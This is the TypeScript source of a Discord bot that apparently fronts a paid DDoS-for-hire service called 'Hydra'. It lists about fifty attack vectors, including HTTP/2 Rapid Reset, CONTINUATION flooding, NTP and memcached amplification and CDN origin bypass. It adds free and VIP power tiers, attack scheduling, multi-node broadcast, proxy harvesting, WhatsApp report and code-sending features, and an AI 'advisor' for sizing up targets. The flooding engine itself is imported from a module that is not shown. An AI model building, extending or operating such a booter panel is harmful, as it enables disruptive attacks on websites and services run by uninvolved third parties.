import fs   from "node:fs";
import http from "node:http";
import path from "node:path";
import {
  Client,
  GatewayIntentBits,
  REST,
  Routes,
  SlashCommandBuilder,
  ChatInputCommandInteraction,
  StringSelectMenuInteraction,
  EmbedBuilder,
  ActionRowBuilder,
  ButtonBuilder,
  ButtonStyle,
  StringSelectMenuBuilder,
  StringSelectMenuOptionBuilder,
  ComponentType,
  Events,
  PermissionFlagsBits,
  AttachmentBuilder,
  MessageFlags,
  type MessageActionRowComponentBuilder,
} from "discord.js";

/** Function that edits the live attack message — uses interaction.editReply() for
 *  proper webhook token handling (interaction replies must go through the webhook API). */
type MonitorEditFn = (opts: {
  embeds:     EmbedBuilder[];
  components: ActionRowBuilder<MessageActionRowComponentBuilder>[];
}) => Promise<unknown>;
import { BOT_TOKEN, APPLICATION_ID, ALL_GUILD_IDS, COLORS, AUTHOR, BOT_NAME, API_BASE, METHOD_EMOJIS } from "./config.js";
import { api, apiProbe, type ScheduledAttack, type AiAdvice, type ProxyStats, type DbRecord, type QueryResult, type QueryStats, type NitroCodeResult } from "./api.js";
import {
  getLogChannelId, setLogChannelId,
  isOwner, isMod,
  addPanelOwner, removePanelOwner, addPanelMod, removePanelMod,
  listPanelOwners, listPanelMods,
  BOOTSTRAP_OWNER_USERNAME,
} from "./bot-config.js";
import { askHydra, askHydraModerate, clearHydraHistory, getHydraMemoryStats, getSessionTimeRemaining } from "./lelouch-ai.js";
import { askSkynet, isSkynetConfigured, getSkynetPoolStatus, addAccountToPool, SkynetRateLimitError } from "./skynetchat.js";
import { enqueueRequest, getRateLimitRemaining, getQueueStatus, type QueuePosition } from "./sky-queue.js";
import { handleVoice } from "./voice.js";
import {
  buildAttackEmbed,
  buildStartEmbed,
  buildStopEmbed,
  buildListEmbed,
  buildStatsEmbed,
  buildAnalyzeEmbed,
  buildMethodsEmbed,
  buildMethodsNavRow,
  METHODS_PAGE_SIZE,
  buildHelpEmbed,
  buildErrorEmbed,
  buildGeassFiles,
  buildAttackFiles,
  buildClusterEmbed,
  buildInfoEmbed,
  buildFinishEmbed,
  buildLangRow,
  buildCheckEmbed,
  buildHealthEmbed,
  type CheckResult,
  type HealthData,
  type GlobalStats,
  type ProbeResult,
} from "./embeds.js";

// ── Per-interaction cache for language toggle re-render ───────────────────────
import type { AnalyzeResult, Method } from "./api.js";
const analyzeCache = new Map<string, AnalyzeResult>();
const methodsCache = new Map<string, { methods: Method[]; layer?: string; page: number; lang: "en" | "pt" }>();
type StatsCache = { stats: Parameters<typeof buildStatsEmbed>[0]; proxyStats?: Parameters<typeof buildStatsEmbed>[1] };
const statsCache  = new Map<string, StatsCache>();
const listCache   = new Map<string, Parameters<typeof buildListEmbed>[0]>();

/** Evict the oldest entries if a cache Map grows beyond `maxSize`. */
function trimMap<K, V>(map: Map<K, V>, maxSize = 200): void {
  if (map.size <= maxSize) return;
  const toDelete = map.size - maxSize;
  const iter = map.keys();
  for (let i = 0; i < toDelete; i++) {
    const key = iter.next().value;
    if (key !== undefined) map.delete(key);
  }
}

if (!BOT_TOKEN) {
  console.error("❌ DISCORD_BOT_TOKEN is not set. Set it in the environment variables.");
  process.exit(1);
}

// ── Method definitions with layer grouping for the select menu ──────────────
const METHOD_OPTIONS = [
  // ── Hydra / Special ────────────────────────────────────────────────────
  { value: "geass-override",      label: "👁️ Hydra Override ∞ [ARES 42v]",    description: "MAX POWER — 42 vectors simultâneos: H3-RapidReset(QUIC)+RapidResetUltra+H2-RST+H2-CONT+HPACK+WAF+TLS+gRPC+DNS+...", emoji: "👁️" },
  { value: "geass-ultima",        label: "🔮 Hydra Ultima ∞ [FINAL FORM 9v]", description: "FORMA FINAL — 9 vetores em todas camadas OSI: RapidReset+WAF+H2Storm+AppFlood+TLS+Conn+Pipeline+SSE+UDP", emoji: "🔮" },
  { value: "bypass-storm",        label: "⚡ Bypass Storm ∞ [3-Phase CF]",    description: "3 fases: TLS Exhaust+ConnFlood → WAF+H2 RST+RapidReset → AppFlood+CacheBust. Anti-Cloudflare/Akamai", emoji: "⚡" },
  // ── L7 Application ─────────────────────────────────────────────────────
  { value: "waf-bypass",          label: "🟣 Hydra WAF Bypass ∞",            description: "JA3+AKAMAI Chrome fingerprint — evades Cloudflare/Akamai WAF",                     emoji: "🟣" },
  { value: "http2-flood",         label: "⚡ HTTP/2 Rapid Reset",             description: "CVE-2023-44487 — 512-stream RST burst per session, millions req/s",               emoji: "⚡" },
  { value: "http2-continuation",  label: "💀 H2 CONTINUATION (CVE-2024)",    description: "CVE-2024-27316 — endless CONTINUATION frames, nginx/Apache OOM — NO patch for nginx ≤1.25.4", emoji: "💀" },
  { value: "hpack-bomb",          label: "🧨 HPACK Bomb (RFC 7541)",         description: "Incremental-indexed headers → HPACK table eviction storm — no CVE, no fix",        emoji: "🧨" },
  { value: "h2-settings-storm",   label: "🌊 H2 Settings Storm",             description: "SETTINGS oscillation + WINDOW_UPDATE flood — 3-layer H2 CPU+memory drain",         emoji: "🌊" },
  { value: "http-pipeline",       label: "🚇 HTTP Pipeline Flood",            description: "HTTP/1.1 keep-alive pipelining — 128 reqs per TCP write, no wait, 300K req/s",      emoji: "🚇" },
  { value: "ws-flood",            label: "🕸️ WebSocket Exhaustion",          description: "Holds thousands of WS conns open — goroutine/thread per conn",                     emoji: "🕸️" },
  { value: "cache-poison",        label: "☠️ CDN Cache Poisoning DoS",       description: "Fills CDN cache with unique keys — 100% origin miss rate eviction",                emoji: "☠️" },
  { value: "slowloris",           label: "🐌 Slowloris",                     description: "25K half-open connections — starves nginx/apache thread pool",                     emoji: "🐌" },
  { value: "conn-flood",          label: "🔗 TLS Connection Flood",           description: "Opens & holds thousands of TLS sockets — pre-HTTP exhaustion",                     emoji: "🔗" },
  { value: "tls-renego",          label: "🔐 TLS Renegotiation DoS",         description: "Forces TLS 1.2 renegotiation — expensive public-key CPU per conn",                 emoji: "🔐" },
  { value: "rudy-v2",             label: "🩸 RUDY v2 — Multipart SlowPOST", description: "multipart/form-data + 70-char boundary — holds server threads, harder to detect",  emoji: "🩸" },
  { value: "http-flood",          label: "🌊 HTTP Flood",                     description: "High-volume HTTP GET — overwhelms web server resources directly",                  emoji: "🌊" },
  { value: "http-bypass",         label: "🛡️ HTTP Bypass",                  description: "Chrome-fingerprinted 3-layer: fetch+Chrome headers+slow drain — defeats WAF/CDN",  emoji: "🛡️" },
  // ── L4 Transport ───────────────────────────────────────────────────────
  { value: "quic-flood",          label: "⚡ QUIC/HTTP3 Flood (RFC 9000)",   description: "QUIC Initial packets — server allocates crypto state per DCID → OOM",             emoji: "⚡" },
  { value: "ssl-death",           label: "💀 SSL Death Record",               description: "1-byte TLS records — 40K AES-GCM decrypts/sec on server CPU",                    emoji: "💀" },
  { value: "udp-flood",           label: "💥 UDP Flood",                     description: "Raw UDP packet flood — saturates L4 bandwidth (setInterval burst engine)",        emoji: "💥" },
  { value: "syn-flood",           label: "🔌 SYN Flood",                     description: "TCP SYN_RECV exhaustion — fills connection table pre-handshake",                  emoji: "🔌" },
  { value: "tcp-flood",           label: "📡 TCP Flood",                     description: "Raw TCP packet flood against open ports",                                          emoji: "📡" },
  // ── L3 Network ─────────────────────────────────────────────────────────
  { value: "icmp-flood",          label: "🔴 ICMP Flood [3-tier engine]",    description: "Real ICMP: Tier1 raw-socket (CAP_NET_RAW), Tier2 hping3, Tier3 UDP saturation burst (always works)", emoji: "🔴" },
  { value: "ntp-amp",             label: "🕐 NTP Flood [mode7+mode3]",       description: "Real NTP binary protocol — mode7 monlist (CVE-2013-5211) + mode3 to port 123 direct flood", emoji: "🕐" },
  { value: "dns-amp",             label: "📛 DNS Water Torture [CDN-bypass]", description: "Floods NS servers with random subdomains — bypasses Cloudflare/CDN entirely, NS servers unprotected", emoji: "📛" },
  { value: "mem-amp",             label: "💾 Memcached UDP Flood [binary]",  description: "Real Memcached binary protocol UDP — get+stats to port 11211, exposed servers common", emoji: "💾" },
  { value: "ssdp-amp",            label: "📡 SSDP M-SEARCH Flood [UPnP]",   description: "Real SSDP protocol to port 1900 — rotates ST targets, random CPFN header, UPnP stack exhaustion", emoji: "📡" },
  // ── ARES OMNIVECT ∞ — Advanced Vectors ────────────────────────────────
  { value: "slow-read",           label: "🐌 Slow Read — TCP Buffer Exhaust",         description: "Pauses TCP recv window — server send buffer fills, all threads block on write",                   emoji: "🐌" },
  { value: "range-flood",         label: "📐 Range Flood — 500× I/O",                 description: "500 byte-range sub-requests per req — server disk/IO seek queue exhausted",                        emoji: "📐" },
  { value: "xml-bomb",            label: "💾 XML Bomb — Billion Laughs XXE",           description: "Nested XML entity expansion — parser OOM crash on any SOAP/XMLRPC endpoint",                      emoji: "💾" },
  { value: "h2-ping-storm",       label: "🏓 H2 PING Storm — RFC 7540 §6.7",          description: "10K PING frames/sec per conn — server must ACK every one; CPU + queue exhaustion",              emoji: "🏓" },
  { value: "http-smuggling",      label: "🎭 HTTP Request Smuggling — TE/CL Desync",  description: "Transfer-Encoding/Content-Length desync — poisons backend request queue permanently",           emoji: "🎭" },
  { value: "doh-flood",           label: "🌐 DoH Flood — DNS-over-HTTPS Exhaust",     description: "Wire-format DNS queries via HTTPS — exhausts recursive resolver thread pool",                    emoji: "🌐" },
  { value: "keepalive-exhaust",   label: "⛓️ Keepalive Exhaust — 128-Req Pipeline",  description: "128-request pipeline per conn held open 15–30s — MaxKeepAliveRequests saturation",             emoji: "⛓️" },
  { value: "app-smart-flood",     label: "🎯 App Smart Flood — DB Query Exhaust",     description: "POSTs to /login /search /checkout with random data — forces uncacheable DB query per request",   emoji: "🎯" },
  { value: "large-header-bomb",   label: "💣 Large Header Bomb — 16KB Overflow",      description: "16KB of randomized headers per request — exhausts HTTP parser buffer allocation on server",       emoji: "💣" },
  { value: "http2-priority-storm",label: "🌀 H2 PRIORITY Storm — Stream Reorder",     description: "PRIORITY frames force server to rebuild stream dependency tree per frame — CPU + heap OOM",       emoji: "🌀" },
  // ── 2026 New Vectors ───────────────────────────────────────────────────
  { value: "rapid-reset",         label: "💥 Rapid Reset Ultra [0-RTT, 2000s/burst]",  description: "CVE-2023-44487 Ultra: 2000 streams/burst, single write(), TLS 0-RTT session reuse — max RST throughput", emoji: "💥" },
  { value: "ws-compression-bomb", label: "💣 WS Compression Bomb [1820× amp]",         description: "permessage-deflate bomb: 36 bytes → 65535 bytes server alloc per frame (1820× amplification)",          emoji: "💣" },
  { value: "h2-goaway-loop",      label: "🔄 H2 GOAWAY Loop [5000 cycles/s]",          description: "5000 TLS+H2 teardown/setup cycles/s — forces goroutine alloc+free storm on Go/Java servers",            emoji: "🔄" },
  { value: "sse-exhaust",         label: "📡 SSE Exhaust [18K goroutine hold]",         description: "Opens 18K Server-Sent Events connections simultaneously — holds server threads indefinitely",              emoji: "📡" },
  { value: "h3-rapid-reset",      label: "⚡ H3 Rapid Reset [QUIC RESET_STREAM]",       description: "CVE-2023-44487 via HTTP/3 QUIC (UDP): 3-packet DCID burst → DCID alloc+stream alloc+RST in one dgram",  emoji: "⚡" },
  // ── Métodos novos (2025-2026) — ainda não listados ──────────────────────
  { value: "h2-rst-burst",        label: "🌊 H2 RST Burst [CVE-2023-44487]",            description: "HEADERS+RST_STREAM puro — write-path overload sem leitura. Mais agressivo que http2-flood",              emoji: "🌊" },
  { value: "grpc-flood",          label: "📡 gRPC Flood [Handler Exhaust]",              description: "application/grpc content-type — esgota pool de handlers gRPC, afeta Go/Java/Python gRPC servers",        emoji: "📡" },
  { value: "h2-storm",            label: "⚡ H2 Storm [6 Sub-Vetores]",                  description: "6 vetores H2 simultâneos: SETTINGS+HPACK+PING+CONTINUATION+DEPENDENCY+DATA — esgota completamente",      emoji: "⚡" },
  { value: "tls-session-exhaust", label: "🔐 TLS Session Exhaust [RSA CPU]",             description: "Full TLS handshake por conn, sem resumption — satura crypto thread pool do servidor (5× mais que conn-flood)", emoji: "🔐" },
  { value: "cache-buster",        label: "💨 Cache Buster [100% Origin Hit]",            description: "Cache-Control:no-cache + Vary bombs + query params únicos — 100% miss no CDN, origem sobrecarregada",    emoji: "💨" },
  { value: "h2-dep-bomb",         label: "🌀 H2 Dep Bomb [O(N²) Priority Tree]",         description: "RFC 7540 §5.3.1 PRIORITY chains exclusivas + RST cascade — O(N²) trabalho no servidor por O(N) frames", emoji: "🌀" },
  { value: "h2-data-flood",       label: "💧 H2 Data Flood [Window Exhaust]",            description: "DATA frames até zerar window size, força flow-control — servidor fica preso gerenciando buffers",         emoji: "💧" },
  // ── CDN Bypass ─────────────────────────────────────────────────────────
  { value: "origin-bypass",       label: "🎯 Origin Bypass [CDN Auto-Bypass]",            description: "Auto-descobre IP de origem (subdomain+IPv6+SPF+MX+crt.sh) → ataca origem diretamente + cache-poison CDN edges", emoji: "🎯" },
];

// ── Duration presets ─────────────────────────────────────────────────────────
const DURATION_OPTIONS = [
  { value: "30",   label: "⏱ 30 segundos",              description: "Burst rápido — Free" },
  { value: "60",   label: "⏱ 1 minuto (padrão)",        description: "Ataque padrão — limite Free" },
  { value: "120",  label: "👑 [VIP] 2 minutos",         description: "VIP — pressão prolongada" },
  { value: "300",  label: "👑 [VIP] 5 minutos",         description: "VIP — assalto sustentado" },
  { value: "600",  label: "👑 [VIP] 10 minutos",        description: "VIP — duração máxima" },
];

// ── Thread presets (power levels 1–8; internally ×500 connections in prod) ───
const THREAD_OPTIONS = [
  { value: "1", label: "⚪ Power 1 — Mínimo",           description: "~500 conexões — teste básico — Free" },
  { value: "2", label: "🟢 Power 2 — Baixo",            description: "~1.000 conexões — Free" },
  { value: "3", label: "🟢 Power 3 — Médio-Baixo",      description: "~1.500 conexões — Free" },
  { value: "4", label: "🟡 Power 4 — Médio (padrão)",   description: "~2.000 conexões — limite Free" },
  { value: "5", label: "👑 [VIP] Power 5 — Médio-Alto", description: "~2.500 conexões — VIP" },
  { value: "6", label: "👑 [VIP] Power 6 — Alto",       description: "~3.000 conexões — VIP" },
  { value: "7", label: "👑 [VIP] Power 7 — Muito Alto", description: "~3.500 conexões — VIP" },
  { value: "8", label: "👑 [VIP] Power 8 — MÁXIMO",     description: "~4.000 conexões por worker — VIP" },
];

// ── Pending launcher sessions (userId → { target, duration, threads }) ───────
interface LaunchSession { target: string; duration: number; threads: number; isVip?: boolean; }
const pendingSessions  = new Map<string, LaunchSession>();
const sessionTimers    = new Map<string, NodeJS.Timeout>();

// ── Attack cooldown — 30s between /attack start per user ──────────────────
const ATTACK_COOLDOWN_MS = 30_000;
const attackCooldowns = new Map<string, number>(); // userId → lastLaunchTimestamp

// ── VIP / Free tier limits ────────────────────────────────────────────────
const FREE_METHODS = new Set([
  "http-flood", "http-bypass", "slowloris", "syn-flood",
  "udp-flood", "tcp-flood", "dns-amp",
]);
const MAX_POWER_FREE    = 4;   // power level 1-4 for free
const MAX_POWER_VIP     = 8;
const MAX_DURATION_FREE = 60;  // seconds
const MAX_DURATION_VIP  = 600;

// ── WhatsApp report/sendcode cooldowns ────────────────────────────────────
const WA_REPORT_COOLDOWN_MS   = 3 * 60 * 1000; // 3 minutos
const WA_SENDCODE_COOLDOWN_MS = 2 * 60 * 1000; // 2 minutos
const waReportCooldowns   = new Map<string, number>();
const waSendcodeCooldowns = new Map<string, number>();

function checkWaCooldown(map: Map<string, number>, uid: string, cdMs: number): number {
  return Math.max(0, cdMs - (Date.now() - (map.get(uid) ?? 0)));
}

// ── WhatsApp histórico por usuário (últimas 20) ───────────────────────────
interface WaHistoryItem { type: "report" | "sendcode"; number: string; sent: number; total: number; at: number }
const waHistory = new Map<string, WaHistoryItem[]>();
function addWaHistoryDiscord(uid: string, e: WaHistoryItem): void {
  const arr = waHistory.get(uid) ?? [];
  arr.push(e);
  if (arr.length > 20) arr.shift();
  waHistory.set(uid, arr);
}

// ── Cooldown map GC — runs every 10min to prevent unbounded growth ──────────
setInterval(() => {
  const now = Date.now();
  for (const [uid, ts] of attackCooldowns) if (now - ts > ATTACK_COOLDOWN_MS * 10) attackCooldowns.delete(uid);
  for (const [uid] of pendingSessions) if (!sessionTimers.has(uid)) pendingSessions.delete(uid);
}, 10 * 60 * 1000).unref();

const SESSION_TTL_MS = 5 * 60 * 1000; // 5 minutes

function clearSession(userId: string): void {
  pendingSessions.delete(userId);
  pendingMethodMap.delete(userId);
  const t = sessionTimers.get(userId);
  if (t) { clearTimeout(t); sessionTimers.delete(userId); }
}

function scheduleSessionExpiry(userId: string): void {
  const existing = sessionTimers.get(userId);
  if (existing) clearTimeout(existing);
  const t = setTimeout(() => {
    pendingSessions.delete(userId);
    pendingMethodMap.delete(userId);
    sessionTimers.delete(userId);
  }, SESSION_TTL_MS);
  sessionTimers.set(userId, t);
}

// ── Slash Command Definitions ─────────────────────────────────────────────────
const COMMANDS = [
  new SlashCommandBuilder()
    .setName("attack")
    .setDescription("⚔️ Hydra Attack Control — launch, stop, and monitor attacks")
    .addSubcommand(sub =>
      sub.setName("start")
        .setDescription("🔴 Launch a new Hydra command — opens method/duration/thread selector")
        .addStringOption(opt =>
          opt.setName("target").setDescription("Target URL or IP (e.g. https://example.com)").setRequired(true)
        )
    )
    .addSubcommand(sub =>
      sub.setName("stop")
        .setDescription("⏹️ Stop a running attack by ID")
        .addIntegerOption(opt =>
          opt.setName("id").setDescription("Attack ID to stop").setRequired(true)
        )
    )
    .addSubcommand(sub =>
      sub.setName("list")
        .setDescription("📋 List all active and recent attacks")
    )
    .addSubcommand(sub =>
      sub.setName("stats")
        .setDescription("📊 Show global aggregate attack statistics")
    ),

  new SlashCommandBuilder()
    .setName("analyze")
    .setDescription("🔍 Analyze a target and get vulnerability recommendations")
    .addStringOption(opt =>
      opt.setName("target").setDescription("Target URL or IP to analyze").setRequired(true)
    ),

  new SlashCommandBuilder()
    .setName("methods")
    .setDescription("⚡ List all available attack vectors")
    .addStringOption(opt =>
      opt.setName("layer")
        .setDescription("Filter by network layer")
        .setRequired(false)
        .addChoices(
          { name: "L7 — Application layer (HTTP, HTTP/2, Slowloris)", value: "L7" },
          { name: "L4 — Transport layer (TCP, UDP, SYN)",             value: "L4" },
          { name: "L3 — Network layer (ICMP, amplification)",         value: "L3" },
        )
    ),

  new SlashCommandBuilder()
    .setName("check")
    .setDescription("🌐 Verificar se um site/IP está respondendo — latência, status e cabeçalhos")
    .addStringOption(opt =>
      opt.setName("target").setDescription("URL ou IP para verificar (ex: https://example.com)").setRequired(true)
    ),

  new SlashCommandBuilder()
    .setName("info")
    .setDescription("👁️ Hydra — platform info, full cluster infrastructure & live stats (EN/PT)"),

  new SlashCommandBuilder()
    .setName("help")
    .setDescription("❓ Show Hydra command guide"),

  new SlashCommandBuilder()
    .setName("cluster")
    .setDescription("🌐 Cluster node management — check health and broadcast Hydra to all nodes")
    .addSubcommand(sub =>
      sub.setName("status")
        .setDescription("🔍 Check health and latency of all configured cluster nodes")
    )
    .addSubcommand(sub =>
      sub.setName("broadcast")
        .setDescription("👁️ Fire Hydra Override ∞ to ALL cluster nodes simultaneously (10× power)")
        .addStringOption(opt =>
          opt.setName("target").setDescription("Target URL or IP (e.g. https://example.com)").setRequired(true)
        )
        .addIntegerOption(opt =>
          opt.setName("duration").setDescription("Duration in seconds (default: 60)").setRequired(false).setMinValue(5).setMaxValue(3600)
        )
        .addIntegerOption(opt =>
          opt.setName("threads").setDescription("Power level 1-8 (padrão: 4 = ~2000 conns)").setRequired(false).setMinValue(1).setMaxValue(8)
        )
    ),

  new SlashCommandBuilder()
    .setName("geass")
    .setDescription("👁️ Launch Hydra Override ∞ — ARES OMNIVECT maximum power, 21 simultaneous real attack vectors")
    .addStringOption(opt =>
      opt.setName("target").setDescription("Target URL or IP (e.g. https://example.com)").setRequired(true)
    )
    .addIntegerOption(opt =>
      opt.setName("duration").setDescription("Duration in seconds (default: 60)").setRequired(false).setMinValue(5).setMaxValue(3600)
    )
    .addIntegerOption(opt =>
      opt.setName("threads").setDescription("Power level 1-8 (padrão: 4 = ~2000 conns)").setRequired(false).setMinValue(1).setMaxValue(8)
    ),

  new SlashCommandBuilder()
    .setName("hydra")
    .setDescription("👁️ Fale com Hydra — IA com personalidade completa do anime")
    .addSubcommand(sub =>
      sub.setName("ask")
        .setDescription("💬 Faça uma pergunta ou pedido à Hydra (qualquer assunto)")
        .addStringOption(opt =>
          opt.setName("message").setDescription("Sua mensagem para Hydra").setRequired(true)
        )
    )
    .addSubcommand(sub =>
      sub.setName("draw")
        .setDescription("🎨 Gere uma imagem com a Hydra — qualquer coisa que imaginar")
        .addStringOption(opt =>
          opt.setName("prompt").setDescription("O que você quer criar?").setRequired(true)
        )
        .addStringOption(opt =>
          opt.setName("style")
            .setDescription("Estilo visual (padrão: dark art)")
            .setRequired(false)
            .addChoices(
              { name: "🎌 Dark anime art (padrão)", value: "geass" },
              { name: "📸 Realista — fotorrealista de alta qualidade", value: "realistic" },
              { name: "◾ Minimal — design limpo e moderno", value: "minimal" },
            )
        )
        .addStringOption(opt =>
          opt.setName("size")
            .setDescription("Formato da imagem")
            .setRequired(false)
            .addChoices(
              { name: "⬜ 1024×1024 — quadrado (padrão)", value: "1024x1024" },
              { name: "🖥️ 1536×1024 — paisagem / widescreen", value: "1536x1024" },
              { name: "📱 1024×1536 — retrato / vertical", value: "1024x1536" },
            )
        )
    )
    .addSubcommand(sub =>
      sub.setName("reset")
        .setDescription("🔄 Limpar histórico de conversa — começar do zero")
    )
    .addSubcommand(sub =>
      sub.setName("memory")
        .setDescription("🧠 Ver o que Hydra aprendeu — base de conhecimento global")
    )
    .addSubcommand(sub =>
      sub.setName("moderate")
        .setDescription("⚖️ Tribunal Hydra julga um usuário com base nas evidências")
        .addUserOption(opt =>
          opt.setName("user").setDescription("O suspeito a ser julgado").setRequired(true)
        )
        .addStringOption(opt =>
          opt.setName("evidence").setDescription("Evidências / comportamento observado").setRequired(true)
        )
        .addStringOption(opt =>
          opt.setName("context").setDescription("Contexto adicional (histórico, reincidência, etc.)").setRequired(false)
        )
    )
    .addSubcommand(sub =>
      sub.setName("serverstats")
        .setDescription("📊 Inteligência do Servidor — análise completa do reino")
    ),

  // ── /schedule ─────────────────────────────────────────────────────────────
  new SlashCommandBuilder()
    .setName("schedule")
    .setDescription("⏰ Agendar um ataque para disparar em horário futuro")
    .addSubcommand(sub =>
      sub.setName("add")
        .setDescription("➕ Criar novo ataque agendado")
        .addStringOption(opt =>
          opt.setName("target").setDescription("URL ou IP do alvo").setRequired(true)
        )
        .addStringOption(opt =>
          opt.setName("when").setDescription("Horário ISO 8601 (ex: 2026-04-16T14:00:00Z)").setRequired(true)
        )
        .addStringOption(opt =>
          opt.setName("method").setDescription("Método de ataque (default: geass-override)").setRequired(false)
        )
        .addIntegerOption(opt =>
          opt.setName("duration").setDescription("Duração em segundos (default: 60)").setRequired(false).setMinValue(5).setMaxValue(3600)
        )
        .addIntegerOption(opt =>
          opt.setName("threads").setDescription("Power level 1-8 (padrão: 4 = ~2000 conns)").setRequired(false).setMinValue(1).setMaxValue(8)
        )
    )
    .addSubcommand(sub =>
      sub.setName("list")
        .setDescription("📋 Listar ataques agendados pendentes")
    )
    .addSubcommand(sub =>
      sub.setName("cancel")
        .setDescription("✕ Cancelar um ataque agendado")
        .addStringOption(opt =>
          opt.setName("id").setDescription("ID do agendamento (sched_...)").setRequired(true)
        )
    ),

  // ── /advisor ──────────────────────────────────────────────────────────────
  new SlashCommandBuilder()
    .setName("advisor")
    .setDescription("🧠 Hydra AI Advisor — análise táctica com Groq llama-3.3-70b")
    .addStringOption(opt =>
      opt.setName("target").setDescription("URL ou IP para analisar").setRequired(true)
    ),

  // ── /proxy ────────────────────────────────────────────────────────────────
  new SlashCommandBuilder()
    .setName("proxy")
    .setDescription("🌐 Gestão do pool de proxies automático")
    .addSubcommand(sub =>
      sub.setName("stats").setDescription("📊 Ver estatísticas do pool de proxies")
    )
    .addSubcommand(sub =>
      sub.setName("refresh").setDescription("🔄 Forçar re-harvest de proxies agora (22 fontes)")
    ),

  // ── /vip ──────────────────────────────────────────────────────────────────
  new SlashCommandBuilder()
    .setName("vip")
    .setDescription("👑 Gestão de planos VIP — status, grant e revoke")
    .addSubcommand(sub =>
      sub.setName("status")
        .setDescription("📋 Ver seu plano atual (Free/VIP) e limites")
        .addUserOption(opt =>
          opt.setName("user").setDescription("Usuário a consultar (admin only)").setRequired(false)
        )
    )
    .addSubcommand(sub =>
      sub.setName("grant")
        .setDescription("⭐ Conceder VIP a um usuário (owner only)")
        .addUserOption(opt =>
          opt.setName("user").setDescription("Usuário a receber VIP").setRequired(true)
        )
        .addIntegerOption(opt =>
          opt.setName("days").setDescription("Dias de duração (0 = permanente)").setRequired(false).setMinValue(0).setMaxValue(3650)
        )
    )
    .addSubcommand(sub =>
      sub.setName("revoke")
        .setDescription("✖ Revogar VIP de um usuário (owner only)")
        .addUserOption(opt =>
          opt.setName("user").setDescription("Usuário a ter VIP revogado").setRequired(true)
        )
    ),

  // ── /stats ────────────────────────────────────────────────────────────────
  new SlashCommandBuilder()
    .setName("stats")
    .setDescription("📡 Server health — uptime, RAM, CPU load, active attacks"),

  // ── /admin ────────────────────────────────────────────────────────────────
  new SlashCommandBuilder()
    .setName("admin")
    .setDescription("👁️ Hydra Kingdom Administration — moderation commands")
    .setDefaultMemberPermissions(PermissionFlagsBits.ManageMessages)
    .addSubcommand(sub =>
      sub.setName("ban")
        .setDescription("⚔️ Banish a subject from the kingdom")
        .addUserOption(opt => opt.setName("user").setDescription("Subject to banish").setRequired(true))
        .addStringOption(opt => opt.setName("reason").setDescription("Reason for banishment").setRequired(false))
    )
    .addSubcommand(sub =>
      sub.setName("unban")
        .setDescription("🕊️ Grant pardon — restore access to a banished subject")
        .addStringOption(opt => opt.setName("userid").setDescription("User ID to unban").setRequired(true))
    )
    .addSubcommand(sub =>
      sub.setName("clear")
        .setDescription("🗑️ Erase evidence — delete messages from this channel")
        .addIntegerOption(opt =>
          opt.setName("amount").setDescription("Number of messages to delete (1–100)").setRequired(true).setMinValue(1).setMaxValue(100)
        )
    )
    .addSubcommand(sub =>
      sub.setName("warn")
        .setDescription("⚠️ Issue a Hydra warning to a subject")
        .addUserOption(opt => opt.setName("user").setDescription("Subject to warn").setRequired(true))
        .addStringOption(opt => opt.setName("reason").setDescription("Reason for warning").setRequired(true))
    )
    .addSubcommand(sub =>
      sub.setName("mute")
        .setDescription("🔇 Silence a subject by Hydra command")
        .addUserOption(opt => opt.setName("user").setDescription("Subject to silence").setRequired(true))
        .addIntegerOption(opt =>
          opt.setName("duration").setDescription("Timeout duration in minutes (1–10080)").setRequired(false).setMinValue(1).setMaxValue(10080)
        )
        .addStringOption(opt => opt.setName("reason").setDescription("Reason for silencing").setRequired(false))
    )
    .addSubcommand(sub =>
      sub.setName("unmute")
        .setDescription("🔊 Restore voice to a silenced subject")
        .addUserOption(opt => opt.setName("user").setDescription("Subject to restore voice").setRequired(true))
    )
    .addSubcommand(sub =>
      sub.setName("kick")
        .setDescription("👢 Expel a subject — they may return unlike a ban")
        .addUserOption(opt => opt.setName("user").setDescription("Subject to expel").setRequired(true))
        .addStringOption(opt => opt.setName("reason").setDescription("Reason for expulsion").setRequired(false))
    )
    .addSubcommand(sub =>
      sub.setName("slowmode")
        .setDescription("🐢 Set slow mode delay on the current channel")
        .addIntegerOption(opt =>
          opt.setName("seconds").setDescription("Delay in seconds (0 = disable, max 21600)").setRequired(true).setMinValue(0).setMaxValue(21600)
        )
    )
    .addSubcommand(sub =>
      sub.setName("logchannel")
        .setDescription("📋 Set the channel where all mod actions are logged")
        .addChannelOption(opt =>
          opt.setName("channel").setDescription("Channel to send mod logs to").setRequired(true)
        )
    ),

  // ── /panel ────────────────────────────────────────────────────────────────
  new SlashCommandBuilder()
    .setName("panel")
    .setDescription("👁️ Painel de Controle Real — acesso exclusivo ao dono e autorizados")
    .addSubcommand(sub =>
      sub.setName("status")
        .setDescription("📊 Status do bot — CPU, RAM, sessões, guilds, uptime")
    )
    .addSubcommand(sub =>
      sub.setName("guilds")
        .setDescription("🌐 Listar todos os servidores onde o bot está")
    )
    .addSubcommand(sub =>
      sub.setName("whitelist")
        .setDescription("📋 Gerenciar whitelist de acesso ao painel")
        .addStringOption(opt =>
          opt.setName("action")
            .setDescription("Ação").setRequired(true)
            .addChoices(
              { name: "➕ Adicionar owner",   value: "add-owner" },
              { name: "➕ Adicionar mod",     value: "add-mod"   },
              { name: "➖ Remover acesso",    value: "remove"    },
              { name: "📋 Listar acessos",    value: "list"      },
            )
        )
        .addUserOption(opt =>
          opt.setName("user").setDescription("Usuário alvo").setRequired(false)
        )
    )
    .addSubcommand(sub =>
      sub.setName("broadcast")
        .setDescription("📢 Enviar mensagem para TODOS os canais de log configurados")
        .addStringOption(opt =>
          opt.setName("message").setDescription("Mensagem a enviar").setRequired(true)
        )
    )
    .addSubcommand(sub =>
      sub.setName("leave")
        .setDescription("🚪 Forçar bot a sair de um servidor específico")
        .addStringOption(opt =>
          opt.setName("guildid").setDescription("ID do servidor").setRequired(true)
        )
    ),

  // ── /whois ────────────────────────────────────────────────────────────────
  new SlashCommandBuilder()
    .setName("whois")
    .setDescription("🔍 Hydra Intelligence — dossier completo: identidade, cargos, permissões, risco e mais")
    .addUserOption(opt =>
      opt.setName("user").setDescription("O sujeito a investigar (padrão: você mesmo)").setRequired(false)
    )
    .addBooleanOption(opt =>
      opt.setName("private").setDescription("Resposta visível apenas para você? (padrão: não)").setRequired(false)
    ),

  // ── /admins ───────────────────────────────────────────────────────────────
  new SlashCommandBuilder()
    .setName("admins")
    .setDescription("👑 Painel de Administradores — gerenciar owners e admins do bot (owner only)")
    .addSubcommand(sub =>
      sub.setName("list")
        .setDescription("📋 Ver todos os owners e admins autorizados")
    )
    .addSubcommand(sub =>
      sub.setName("add-owner")
